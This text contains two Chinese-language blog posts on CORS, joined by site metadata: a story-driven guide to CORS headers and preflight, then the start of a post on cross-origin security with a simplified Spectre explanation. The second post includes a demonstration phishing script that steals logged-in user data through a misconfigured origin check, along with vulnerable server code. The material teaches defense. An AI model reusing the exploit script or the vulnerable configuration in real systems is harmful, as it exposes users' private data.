Goolge 表單但是是小明自己做的）： 小明花了半天不到的時間，把頁面都刻好了，功能也差不多做完了，只剩下最後一步而已。小明的主管跟他說公司常常會對外舉辦一些活動，而在活動尾聲都會提供這個表單給大家，希望大家統一透過表單留下聯絡資料。 因此表單上的「怎麼知道我們公司的？」就會希望能夠動態調整欄位，在活動期間加一個「透過在 1&#x2F;10 舉辦的技術分享會」的選項，而活動結束後大概兩個禮拜把這個選項撤掉。之所以要能動態調整，主管說是因為不想讓後續維護的工再回到開發這端，如果一開始就能做成動態的，那未來只要他們自己維護就行了，讓他們能夠透過後台自己去控制。 所以後端開了一個 API 出來，要小明去接這個 API 然後把內容 render 出來變成選項。為了方便測試，後端工程師先把整個 API service 打包成 docker image，然後讓小明跑在自己電腦上，網址是：http://localhost:3000。 小明接到這個任務之後，想說先把 API 內容抓下來看看好了，於是就寫了這樣一段程式碼： fetch('http://localhost:3000') 然後發現 console 出現了錯誤訊息： 小明沒有看得很懂那是什麼意思，只注意到了最後一段： If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. 於是幫 fetch 加上了 no-cors 的 mode： fetch('http://localhost:3000', &#123; mode: 'no-cors' &#125;).then(res => console.log(res)) 改完之後重新整理，發現沒有錯誤了，可是印出來的 response 長得特別奇怪： 沒有任何資料，而且 status 居然是 0。小明在這之後 debug 很久，找不出原因，不知道為什麼就是拿不到資料。眼看死線將近，小明鼓起勇氣去求助了前輩小華，小華跟他說： 這是當然的啊，no-cors 是個很容易誤導初學者的參數，他的意思並不是「繞過 cors 拿到資料」，而是「我知道它過不了 cors，但我沒差，所以不要給我錯誤也不要給我 response」 你這問題一定要透過後端去解，我幫你跟後端說一聲吧 小華前輩不愧資深，三兩下就解決了小明的問題。而後端那邊也幫忙加上了一個 header：Access-Control-Allow-Origin: *，代表來自任何 origin 的網站都可以用 AJAX 存取這個資源。 後端程式碼： app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.json(&#123; data: db.getFormOptions(), &#125;) &#125;) 小明把原本的 mode 拿掉，改成： fetch('http://localhost:3000') .then(res => res.json()) .then(res => console.log(res)) 打開了瀏覽器，發現可以成功拿到選項了，也從 network tab 裡面看到了新增加的 header： 拿到資料以後，就只剩下把選項放上去畫面而已，大概又半天的時間，小明就把這個功能做完並且測試完了，感謝小華前輩的幫助。 Day1 總結mode: &#39;no-cors&#39; 跟你想的不一樣，這個沒有辦法解決 CORS 問題。 碰到 CORS 問題的時候，先確認後端有沒有給你 Access-Control-Allow-Origin 這個 header，沒有的話請後端給你，否則你怎麼試都不會過。 Access-Control-Allow-Origin 的值可以帶 *，代表 wildcard，任何 origin 都合法，也可以帶 origin 像是 http://huli.tw，代表只有這個 origin 是合法的。 如果想帶多個的話呢？抱歉，沒有辦法，就是只能全部都給過或者是給一個 origin。因此也有後端會根據 request 的 origin 來決定 response 的 Access-Control-Allow-Origin 值會是多少，這個我們之後會再提到。 Day2：不簡單的 CORS隔了一天之後，主管跟小明說更上層的人不滿意這個使用者體驗，送出表單之後要等個一兩秒才能看到成功的畫面，而且這中間也沒有 loading 什麼的，體驗不好，希望能改成 AJAX 的做法送出表單而不是換頁，就可以改善使用者體驗。 為了因應這個改變，後端又多出了一個 API：POST /form，而且這次後端已經很自動地把 Access-Control-Allow-Origin 的 header 加上去了： app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') // 省略寫到 db 的程式碼 res.json(&#123; success: true &#125;) &#125;) 小明之前已經做過類似的事情，因此很快就把程式碼寫好了： document.querySelector('.contact-us-form') .addEventListener('submit', (e) => &#123; // 阻止表單送出 e.preventDefault() // 設置參數 var data = new URLSearchParams(); data.append('email', 'test@test.com') data.append('source', 'search') // 送出 request fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125;, body: data &#125;).then(res => res.json()) .then(res => console.log(res)) &#125;) 測試之後也沒有問題，正當小明要跟主管報告做好的時候，後端走過來跟小明說：「不好意思，我們後端最近做了一些改動，未來要統一改成用 JSON 當作資料格式，所以你那邊也要改一下，要送 JSON 過來而不是 urlencoded 的資料」 小明聽了之後心想：「這簡單嘛，不就是改一下資料格式嗎？」，於是改成這樣： document.querySelector('.contact-us-form') .addEventListener('submit', (e) => &#123; // 阻止表單送出 e.preventDefault() // 設置參數 var data = &#123; email: 'test@test.com', soruce: 'search' &#125; // 送出 request fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) &#125;) 就只是換一下資料格式而已，改成用 JSON 的方式傳資料到後端。改完之後小明再測試了一遍，發現這一次居然掛掉了，而且出現錯誤訊息： Access to fetch at ‘http://localhost:3000/form‘ from origin ‘null’ has been blocked by CORS policy: Response to preflight request doesn’t pass access control check: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. 切到 network tab 去看 request 的狀況，發現除了原本預期的 POST 以外，還多了一個 OPTIONS 的 request： 小明上網用錯誤訊息給的關鍵字：preflight request 找了一下資料，發現 CORS 沒有他想像中的簡單。 原來之前發送的那些請求都叫做「簡單請求」，只要 method 是 GET、POST 或是 HEAD 然後不要帶自訂的 header，Content-Type 也不要超出：application/x-www-form-urlencoded、multipart/form-data 或是 text/plain 這三種，基本上就可以被視為是「簡單請求」（更詳細的定義下一篇會說）。 一開始串 API 的時候沒有碰到錯誤，是因為 Content-Type 是 application/x-www-form-urlencoded，所以被視為是簡單請求。後來改成 application/json 就不符合簡單請求的定義了，就變成是「非簡單請求」。 那非簡單請求會怎麼樣呢？會多送出一個東西，叫做 preflight request，中文翻作「預檢請求」。這個請求就是小明在 network tab 看到的那個 OPTIONS 的 request，針對這個 request，瀏覽器會幫忙帶上兩個 header： Access-Control-Request-Headers Access-Control-Request-Method 以剛剛我們看到的 /form 的 preflight request 來說，內容是： Access-Control-Request-Headers: content-type Access-Control-Request-Method: POST 前者會帶上不屬於簡單請求的 header，後者會帶上 HTTP Method，讓後端對前端想送出的 request 有更多的資訊。 如果後端願意放行，就跟之前一樣，回一個 Access-Control-Allow-Origin 就好了。知道這點以後，小明馬上請後端同事補了一下，後端程式碼變成： app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.json(&#123; success: true &#125;) &#125;) // 多加這個，讓 preflight 通過 app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.end() &#125;) 改好以後小明重新試了一下，發現居然還是有錯誤： Access to fetch at ‘http://localhost:3000/form‘ from origin ‘null’ has been blocked by CORS policy: Request header field content-type is not allowed by Access-Control-Allow-Headers in preflight response. 當你的 CORS request 含有自訂的 header 的時候，preflight response 需要明確用 Access-Control-Allow-Headers 來表明：「我願意接受這個 header」，瀏覽器才會判斷預檢通過。 而在這個案例中，content-type 就屬於自訂 header，所以後端必須明確表示願意接受這個 header： app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Allow-Headers', 'content-type') res.end() &#125;) 如此一來，小明那邊就可以順利通過 preflight request，只有在通過 preflight 之後，真正的那個 request 才會發出。 流程會像是這樣： 我們要送出 POST 的 request 到 http://localhost:3000/form 瀏覽器發現是非簡單請求，因此先發出一個 preflight request 檢查 response，preflight 通過 送出 POST 的 request 到 http://localhost:3000/form 所以如果 preflight 沒有過，第一個步驟的 request 是不會被送出的。 經歷過一番波折之後，這個改動總算也順利完成了。現在我們可以成功在前端用 AJAX 的方式送出表單資料了。 Day2 總結CORS request 分成兩種：簡單請求與非簡單請求，無論是哪一種，後端都需要給 Access-Control-Allow-Origin 這個 header。而最大的差別在於非簡單請求在發送正式的 request 之前，會先發送一個 preflight request，如果 preflight 沒有通過，是不會發出正式的 request 的。 針對 preflight request，我們也必須給 Access-Control-Allow-Origin 這個 header 才能通過。 除此之外，有些產品可能會想要送一些自訂的 header，例如說X-App-Version 好了，帶上目前網站的版本，這樣後端可以做個紀錄： fetch('http://localhost:3000/form', &#123; method: 'POST', headers: &#123; 'X-App-Version': \"v0.1\", 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) 當你這樣做以後，後端也必須新增 Access-Control-Allow-Headers，才能通過 preflight： app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Allow-Headers', 'X-App-Version, content-type') res.end() &#125;) 簡單來說，preflight 就是一個驗證機制，確保後端知道前端要送出的 request 是預期的，瀏覽器才會放行。我之前所說的「跨來源請求擋的是 response 而不是 request」，只適用於簡單請求。對於有 preflight 的非簡單請求來說，你真正想送出的 request 確實會被擋下來。 那為什麼會需要 preflight request 呢？這邊可以從兩個角度去思考： 相容性 安全性 針對第一點，你可能有發現如果一個請求是非簡單請求，那你絕對不可能用 HTML 的 form 元素做出一樣的 request，反之亦然。舉例來說，&lt;form&gt; 的 enctype 不支援 application/json，所以這個 content type 是非簡單請求；enctype 支援 multipart/form，所以這個 content type 屬於簡單請求。 對於那些古老的網站，甚至於是在 XMLHttpRequest 出現之前就存在的網站，他們的後端沒有預期到瀏覽器能夠發出 method 是 DELETE 或是 PATCH 的 request，也沒有預期到瀏覽器會發出 content-type 是 application/json 的 request，因為在那個時代 &lt;form&gt; 跟 &lt;img&gt; 等等的元素是唯一能發出 request 的方法。 那時候根本沒有 fetch，甚至連 XMLHttpRequest 都沒有。所以為了不讓這些後端接收到預期外的 request，就先發一個 preflight request 出去，古老的後端沒有針對這個 preflight 做處理，因此就不會通過，瀏覽器就不會把真正的 request 給送出去。 這就是我所說的相容性，通過預檢請求，讓早期的網站不受到傷害，不接收到預期外的 request。 而第二點安全性的話，還記得在第一篇問過大家的問題嗎？送出 POST request 刪除文章的那個問題。刪除的 API 一般來說會用 DELETE 這個 HTTP method，如果沒有 preflight request 先擋住的話，瀏覽器就會真的直接送這個 request 出去，就有可能對後端造成未預期的行為（沒有想到瀏覽器會送這個出來）。 所以才需要 preflight request，確保後端知道待會要送的這個 request 是合法的，才把真正的 request 送出去。 Day3：帶上 Cookie昨天改的那版受到上層的極力讚賞，主管也請小明跟小華喝了手搖飲來慶祝。只是正當他們開心之時，行銷部門的人跑來了，問說：「為什麼這些 request 都沒有 cookie？我們需要使用者的 cookie 來做分析，請把這些 cookie 帶上」。 此時小明才突然想起來：「對欸，跨來源的請求，預設是不會帶 cookie 的」，查了一下 MDN 之後，發現只要帶：credentials: &#39;include&#39; 應該就行了： fetch('http://localhost:3000/form', &#123; method: 'POST', credentials: 'include', // 新增這個 headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(data) &#125;).then(res => res.json()) .then(res => console.log(res)) 可是沒想到前端卻出現了錯誤訊息： Access to fetch at ‘http://localhost:3000/form‘ from origin ‘http://localhost:8080‘ has been blocked by CORS policy: Response to preflight request doesn’t pass access control check: The value of the ‘Access-Control-Allow-Origin’ header in the response must not be the wildcard ‘*’ when the request’s credentials mode is ‘include’. 錯誤訊息其實已經解釋得很清楚了，如果要帶上 cookie 的話，那 Access-Control-Allow-Origin 不能是 *，一定要明確指定 origin。 為什麼會這樣呢？因為如果沒有這個限制的話，那代表任何網站（任何 origin）都可以發 request 到這個 API，並且帶上使用者的 cookie，這樣就會有安全性的問題產生，大概就跟 CSRF 有異曲同工之妙。 所以因為安全性的關係，強制你如果要帶上 cookie，後端一定要明確指定是哪個 origin 有權限。除此之外，後端還要額外帶上 Access-Control-Allow-Credentials: true 這個 header。 於是小明再度請小華改一下後端： const VALID_ORIGIN = 'http://localhost:8080' app.post('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) // 明確指定 res.header('Access-Control-Allow-Credentials', true) // 新增這個 res.json(&#123; success: true &#125;) &#125;) app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) // 明確指定 res.header('Access-Control-Allow-Credentials', true) // 新增這個 res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) 改完之後的版本明確指定 http://localhost:8080 才有權限存取 CORS Response，也加上了 Access-Control-Allow-Credentials 這個 header。 如此一來就大功告成了，在發送 request 的時候可以成功帶上 Cookie，行銷部門那邊的需求也搞定了，耶依。 Day3 總結如果你需要在發送 request 的時候帶上 cookie，那必須滿足三個條件： 後端 Response header 有 Access-Control-Allow-Credentials: true 後端 Response header 的 Access-Control-Allow-Origin 不能是 *，要明確指定 前端 fetch 加上 credentials: &#39;include&#39; 這三個條件任何一個不滿足的話，都是沒辦法帶上 cookie 的。 除了這個之外還有一件事情要特別注意，那就是不只帶上 cookie，連設置 cookie 也是一樣的。後端可以用 Set-Cookie 這個 header 讓瀏覽器設置 cookie，但一樣要滿足上面這三個條件。如果這三個條件沒有同時滿足，那儘管有 Set-Cookie 這個 header，瀏覽器也不會幫你設置，這點要特別注意。 事實上呢，無論有沒有想要存取 Cookie，都會建議 Access-Control-Allow-Origin 不要設定成 * 而是明確指定 origin，避免預期之外的 origin 跨站存取資源。若是你有多個 origin 的話，建議在後端有一個 origin 的清單，判斷 request header 內的 origin 有沒有在清單中，有的話就設定 Access-Control-Allow-Origin，沒有的話就不管它。 Day4：存取自訂 header還記得我們一開始串的那一個 API 嗎？跟後端拿選項的 API。雖然之前已經順利完成，但沒想到有隕石砸下來了。今天早上上面說要加一個新的需求。 這個需要是要對這個 API 的內容做版本控制，後端會在 response header 裡面多帶上一個 header：X-List-Version，來讓前端知道這個選項的清單是哪一個版本。 而前端則是要拿到這個版本，並且把值放到表單裡面一起送出。 後端會像是這樣： app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('X-List-Version', '1.3') res.json(&#123; data: [ &#123;name: '1/10 活動', id: 1&#125;, &#123;name: '2/14 特別活動', id: 2&#125; ] &#125;) &#125;) 由於這一個 API 的內容本來就是公開的，所以沒有允許特定的 origin 也沒有關係，可以安心使用 wildcard。 小明把之前的程式碼改了一下，試著把 header 先列印出來看看： fetch('http://localhost:3000') .then(res => &#123; console.log(res.headers.get('X-List-Version')) return res.json() &#125;) .then(res => console.log(res)) 此時，神奇的事情發生了。明明從 network tab 去看，確實有我們要的 response header，但是在程式裡面卻拿不到，輸出 null。小明檢查了幾遍，確定字沒打錯，而且沒有任何錯誤訊息，但就是拿不到。 卡了一個小時之後，小明決定再次求助前輩小華。小華身為資深前輩，一看到這個狀況之後就說了： 如果你要存取 CORS response 的 header，尤其是這種自定義的 header 的話，後端要多帶一個 Access-Control-Expose-Headers 的 header 喔，這樣前端才拿得到 「原來是這樣嗎！」小明恍然大悟，去找了後端的同事，讓他加上這個 header： app.get('/', (req, res) => &#123; res.header('Access-Control-Allow-Origin', '*') res.header('Access-Control-Expose-Headers', 'X-List-Version') // 加這個 res.header('X-List-Version', '1.3') res.json(&#123; data: [ &#123;name: '1/10 活動', id: 1&#125;, &#123;name: '2/14 特別活動', id: 2&#125; ] &#125;) &#125;) 改完之後小明再測試一遍，發現果真可以正確拿到 header 了！感恩小華，讚嘆小華，平安的一天又度過了。 Day4 總結當你拿到跨來源的 response 的時候，基本上都可以拿到 response body，也就是內容。但是 header 就不一樣了，只有幾個基本的 header 可以直接拿到，例如說 Content-Type 就是一個。 除此之外，如果你想拿其他 header，尤其是自定義的 header 的話，後端就需要帶上 Access-Control-Expose-Headers，讓瀏覽器知道說：「我願意把這個 header 開放出去讓 JS 看到」，這樣子前端才能順利抓到 header。 如果沒有加的話就會拿到 null，就跟這個 header 不存在一樣。 Day5：編輯資料原本以為一切都很順利的小明又再次踢到了鐵板。這次是老闆那邊提出的需求，現在一送出表單之後就沒機會再更改了，若是使用者意識到哪邊有填錯，就只能重新再填一遍。而老闆覺得這樣的體驗不好，希望在使用者送出表單以後還有一次機會能夠挽回，可以編輯剛剛送出的表單。 跟後端討論過後，在送出表單之後後端會給一個 token，前端只要帶著這個 token 去打 PATCH /form 這個 API，就能夠編輯剛剛表單的內容。 後端長得像這樣，一樣有把該加的 header 都加好： const VALID_ORIGIN = 'http://localhost:8080' app.patch('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) // 省略編輯的部分 res.json(&#123; success: true &#125;) &#125;) app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) 而小明立刻開始著手前端的部分，大概像是這樣： fetch('http://localhost:3000/form', &#123; method: 'PATCH', credentials: 'include', headers: &#123; 'X-App-Version': \"v0.1\", 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; token: 'test_token', content: 'new content' &#125;) &#125;).then(res => res.json()) .then(res => console.log(res)) 其實跟之前送出表單的程式碼八七分像，差別大概只在 body 跟 method 的部分。然而，小明在測試的時候，瀏覽器又跳出錯誤了： Access to fetch at ‘http://localhost:3000/form‘ from origin ‘http://localhost:8080‘ has been blocked by CORS policy: Method PATCH is not allowed by Access-Control-Allow-Methods in preflight response. 跨來源的請求只接受三種 HTTP Method：GET、HEAD 以及 POST，除了這三種之外，都必須由後端回傳一個 Access-Control-Allow-Methods，讓後端決定有哪些 method 可以用。 因此後端要改成這樣： // preflight app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Methods', 'PATCH') // 多這個 res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.end() &#125;) 如此一來，瀏覽器就知道前端能夠使用 PATCH 這個 method，就不會把後續的 request 給擋下來了。 Day5 總結如果前端要使用 GET、HEAD 以及 POST 以外的 HTTP method 發送請求的話，後端的 preflight response header 必須有 Access-Control-Allow-Methods 並且指定合法的 method，preflight 才會通過，瀏覽器才會把真正的 request 發送出去。 這個就跟前面提過的 Access-Control-Allow-Headers 有點像，只是一個是在規範可以用哪些 method，一個是在規範可以用哪些 request headers。 Day6：快取 preflight request好不容易滿足了公司各個大頭的需求，沒想到在上線前夕，技術這端出問題了。小明原本以為解掉了所有跨來源的問題就行了，可是卻忽略了一個地方。在 QA 對網站做壓測的時候，發現 preflight request 的數量實在是太多了，而且就算同一個使用者已經預檢過了，每次都還是需要再檢查，其實滿浪費效能的。 於是 QA 那邊希望後端可以把這個東西快取住，這樣如果同一個瀏覽器重複發送 request，就不用再做預檢。 雖然說小明是做前端的，但他其實想成為 CORS 大師，於是就跟後端一起研究該怎麼解決這個問題。最後他們找到了一個 header：Access-Control-Max-Age，可以跟瀏覽器說這個 preflight response 能夠快取幾秒。 接著後端把這個 header 加上去： app.options('/form', (req, res) => &#123; res.header('Access-Control-Allow-Origin', VALID_ORIGIN) res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Headers', 'content-type, X-App-Version') res.header('Access-Control-Max-Age', 300) res.end() &#125;) 這樣 preflight response 就會被瀏覽器快取 300 秒，在 300 秒內對同一個資源都不會再打到後端去做 preflight，而是會直接沿用快取的資料。 總結讓我們一個一個來回憶故事中出現的各個 header。 一開始小明需要存取跨來源請求的 response，因此需要後端協助提供 Access-Control-Allow-Origin，證明這個 origin 是有權限的。 再來因為要帶自訂的 header，所以後端要提供 Access-Control-Allow-Headers，寫明 client 可以帶哪些 header 上去。同時也因為多了 preflight requset，後端要特別處理 OPTIONS 的 request。 然後我們需要用到 cookie，所以 Access-Control-Allow-Origin 不能是 *，要改成單一的 origin。而後端也要多提供 Access-Control-Allow-Credentials: true。 接著前端需要存取 header，所以後端必須提供 Access-Control-Expose-Headers，跟瀏覽器說前端可以拿到哪些 header。而前端如果要使用 HEAD、GET 跟 POST 之外的 method，後端要加上 Access-Control-Allow-Methods。 關於快取的部分，則是用 Access-Control-Max-Age。 整串故事看下來，其實你會發現根本沒什麼前端的事情。前端在整個故事中擔任的角色就是：寫 code &#x3D;&gt; 發現錯誤 &#x3D;&gt; 回報後端 &#x3D;&gt; 後端修正 &#x3D;&gt; 完成功能。這也呼應了我之前一再強調的：「CORS 的問題，通常都不是前端能解決的」。 說穿了，CORS 就是藉由一堆的 response header 來跟瀏覽器講說哪些東西是前端有權限存取的。如果沒有後端給的這些 header，那前端根本什麼也做不了。因此無論是前端還是後端，都有必要知道這些 header，未來碰到相關問題的時候才知道怎麼解決。 順帶一提，我覺得 Chrome 的錯誤提示好像愈做愈棒了，印象中以前好像沒有講得那麼詳細，現在詳細到爆，甚至可以直接看錯誤訊息而不 Google 就知道該怎麼修。 希望透過這一篇，能讓大家理解 CORS 有哪些 response header，以及什麼是 preflight request，在哪些情形之下會觸發。理解這些以後，你對整個 CORS protocol 的理解大概就有八成了。 在下一篇 CORS 完全手冊（四）：一起看規範中，我們會一起來看看規格，更進一步理解 CORS protocol。","link":"/2021/02/19/cors-guide-3/"},{"title":"CORS 完全手冊（五）：跨來源的安全性問題","text":"前言在前面幾篇裡面，我們知道 CORS protocol 基本上就是為了安全性所產生的協定，而除了 CORS 以外，其實還有一系列跟跨來源有關的東西，例如說： CORB（Cross-Origin Read Blocking） CORP（Cross-Origin Resource Policy） COEP（Cross-Origin-Embedder-Policy） COOP（Cross-Origin-Opener-Policy） 是不是光看到這一系列很類似的名詞就已經頭昏眼花了？對，我也是。在整理這些資料的過程中，發現跨來源相關的安全性問題比我想像中還來得複雜，不過花點時間整理之後發現還是有脈絡可循，因此這篇會以我覺得應該比較好理解的脈絡，去講解為什麼會有這些東西出現。 除了上面這些 COXX 的各種東西，還有其他我想提的跨來源相關安全性問題，也會在這篇一併提到。 在繼續下去之前先提醒一下大家，這篇在講的是「跨來源的安全性問題」，而不單單只是「CORS 的安全性問題」。CORS protocol 所保護的東西跟內容在之前都介紹過了，這篇要談的其實已經有點偏離大標題「CORS」完全手冊，因為這跟 CORS 協定關係不大，而是把層次再往上拉高，談談「跨來源」這件事情。 所以在看底下的東西的時候，不要把它跟 CORS 搞混了。除了待會要講的第一個東西，其他的跟 CORS 關係都不大。 CORS misconfiguration如果你還記得的話，前面我有提到過如果跨來源請求想要帶上 cookie，那 Access-Control-Allow-Origin 就不能是 *，而是必須指定單一的 origin，否則瀏覽器就不會給過。 但現實的狀況是，我們不可能只有一個 origin。我們可能有許多的 origin，例如說 buy.example.com、social.example.com、note.example.com，都需要去存取 api.example.com，這時候我們就沒辦法寫死 response header 裡的 origin，而是必須動態調整。 先講一種最糟糕的寫法，就是這樣： app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' res.headers['Access-Control-Allow-Origin'] = req.headers['Origin'] &#125;) 為了方便起見，所以直接映射 request header 裡面的 origin。這樣做的話，其實就代表任何一個 origin 都能夠通過 CORS 檢查。 這樣做會有什麼問題呢？ 問題可大了。 假設我今天做一個釣魚網站，網址是 http://fake-example.com，並且試圖讓使用者去點擊這個網站，而釣魚網站裡面寫了一段 script： // 用 api 去拿使用者資料，並且帶上 cookie fetch('http://api.example.com/me', &#123; credentials: 'include' &#125;) .then(res => res.text()) .then(res => &#123; // 成功拿到使用者資料，我可以傳送到我自己的 server console.log(res) // 把使用者導回真正的網站 window.location = 'http://example.com' &#125;) 我用 fetch 去打 http://api.example.com/me 拿資料，並且帶上 cookie。接著因為 server 不管怎樣都會回覆正確的 header，所以 CORS 檢查就通過了，我就拿到資料了。 因此這個攻擊只要使用者點了釣魚網站並且在 example.com 是登入狀態，就會中招。至於影響範圍要看網站的 api，最基本的就是只拿得到使用者資料，比較嚴重一點的可能可以拿到 user token（如果有這個 api）。 這個攻擊有幾件事情要注意： 這不是 XSS，因為我沒有在 example.com 執行程式碼，我是在我自己的釣魚網站 http://fake-example.com 上執行 這有點像是 CSRF，但是網站通常對於 GET 的 API 並不會加上 CSRF token 的防護，所以可以過關 如果有設定 SameSite cookie，攻擊就會失效，因為 cookie 會帶不上去 因此這個攻擊要成立有幾個前提： CORS header 給到不該給的 origin 網站採用 cookie 進行身份驗證，而且沒有設定 SameSite 使用者要主動點擊釣魚網站並且是登入狀態 針對第一點，可能沒有人會像我上面那樣子寫，直接用 request header 的 origin。比較有可能的做法是這樣： app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' const origin = req.headers['Origin'] // 偵測是不是 example.com 結尾 if (/example\\.com$/.test(origin)) &#123; res.headers['Access-Control-Allow-Origin'] = origin &#125; &#125;) 如此一來，底下的 origin 都可以過關： example.com buy.example.com social.example.com 可是這樣寫是有問題的，因為這樣也可以過關： fakeexample.com 像是這類型的漏洞是經由錯誤的 CORS 設置引起，所以稱為 CORS misconfiguration。 而解決方法就是不要用 RegExp 去判斷，而是事先準備好一個清單，有在清單中出現的才通過，否則都是失敗，如此一來就可以保證不會有判斷上的漏洞，然後也記得把 cookie 加上 SameSite 屬性。 const allowOrigins = [ 'example.com', 'buy.example.com', 'social.example.com' ] app.use((req, res, next) => &#123; res.headers['Access-Control-Allow-Credentials'] = 'true' const origin = req.headers['Origin'] if (allowOrigins.includes(origin)) &#123; res.headers['Access-Control-Allow-Origin'] = origin &#125; &#125;) 想知道更多的話可以參考： 3 Ways to Exploit Misconfigured Cross-Origin Resource Sharing (CORS) JetBrains IDE Remote Code Execution and Local File Disclosure AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle 繞過 Same-origin Policy？除了 CORS 以外，Same-origin policy 其實出現在瀏覽器的各個地方，例如說 window.open 以及 iframe。當你使用 window.open 打開一個網頁的時候，回傳值會是那個新的網頁的 window（更精確來說是 WindowProxy 啦，可以參考 MDN: Window.open()），但只有在 same origin 的狀況下才能存取，如果不是 same origin 的話，只能存取很小一部分的東西。 假設我現在在 a.example.com 好了，然後寫了這一段 script： var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; console.log(win) &#125;, 2000) 用 window.open 去開啟 b.example.com，等頁面載入完成之後去存取 b.example.com 的 window。 執行之後會看到 console 有一段錯誤： 因為 a.example.com 跟 b.example.com 是 cross origin，所以沒辦法存取到 window。這個規範其實也十分合理，因為如果能存取到 window 的話其實可以做滿多事情的，所以限制在 same origin 底下才能拿到 window。 不過「沒辦法存取 window」這個說法不太精確，因為就算是 cross origin，仍然有一些操作是允許的，例如說： var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; // 變更開啟的 window 的位置 win.location = 'https://google.com' setTimeout(() => &#123; // 關閉視窗 win.close() &#125;, 2000) &#125;, 2000) 可以改變開啟的 window 的 location，也可以關閉開啟的視窗。 相對地，身為被開啟的那個視窗（b.example.com），也可以用 window.opener 拿到開啟它的網頁（a.example.com）的 window，不過一樣只有部分操作是被允許的。 但是呢，如果這兩個網站是在同一個 subdomain 底下，而且你對兩個網站都有控制權，是可以透過更改 document.domain 來讓他們的 origin 相同的！ 在 a.example.com，這樣子做： // 新增這個，把 domain 設為 example.com document.domain = 'example.com' var win = window.open('http://b.example.com') // 等新的頁面載入完成 setTimeout(() => &#123; console.log(win.secret) // 12345 &#125;, 2000) 在 b.example.com 裡面也需要做一樣的事情： document.domain = 'example.com' window.secret = 12345 然後你就會神奇地發現，你現在可以拿到 b.example.com 的 window 了！而且幾乎是什麼操作都可以做。 更詳細的介紹可以參考 MDN：Document.domain，會這樣可能是有什麼歷史因素，但未來因為安全性的問題有可能會被拔掉就是了。 相關的 spec 可以參考：7.5.2 Relaxing the same-origin restriction 進入正題：其他各種 COXX 是什麼？前面這兩個其實都只是小菜而已，並不是這一篇著重的主題。這一篇最想跟大家分享的其實是： CORB（Cross-Origin Read Blocking） CORP（Cross-Origin Resource Policy） COEP（Cross-Origin-Embedder-Policy） COOP（Cross-Origin-Opener-Policy） 這幾個東西。 開頭我有提過了，這幾個東西沒有好好講的話很容易搞混，所以我會用我自己覺得可能比較好懂的方式來講解，接下來就開始吧。 嚴重的安全漏洞：Meltdown 與 Spectre在 2018 年 1 月 3 號，Google 的 Project Zeror 對外發布了一篇名為：Reading privileged memory with a side-channel 的文章，裡面講述了三種針對 CPU data cache 的攻擊： Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) 而前兩種又被稱為 Spectre，第三種被稱為是 Meltdown。如果你有印象的話，在當時這可是一件大事，因為問題是出在 CPU，而且並不是個容易修復的問題。 而這個漏洞的公佈我覺得對於瀏覽器的運作機制有滿大的影響（或至少加速了瀏覽器演進的過程），尤其是 spectre 可以拿來攻擊瀏覽器，而這當然也影響了這系列的主題：跨來源資源存取。 因此，稍微理解一下 Spectre 在幹嘛我覺得是很有必要的。如果想要完全理解這個攻擊，需要有滿多的背景知識，但這不是這一篇主要想講的東西，因此底下我會以非常簡化的模型來解釋 Spectre，想要完全理解的話可以參考上面的連結。 超級簡化版的 Spectre 攻擊解釋再次強調，這是為了方便理解所簡化過的版本，跟原始的攻擊有一定出入，但核心概念應該是類似的。 假設現在有一段程式碼（C 語言）長這樣子： uint8_t array1[16] = &#123;1, 2, 3&#125;; uint8_t array2[256]; unsigned int array1_size = 16; void run(size_t x) &#123; if(x &lt; array1_size) &#123; uint8_t y = array2[array1[x]]; &#125; &#125; size_t x = 1; run(x); 我宣告了兩個陣列，型態是 uint8_t，所以每個陣列的元素大小都會是 1 個 byte（8 bit）。而 array1 的長度是 16，array2 的長度是 256。 接下來我有一個 function 叫做 run，會吃一個數字 x，然後判斷 x 是不是比 array1_size 小，是的話我就先把 array1[x] 的值取出來，然後作為索引去存取 array2，再把拿到的值給 y。 以上面的例子來說，run(1) 的話，就會執行： uint8_t y &#x3D; array2[array1[1]]; 而 array1[1] 的值是 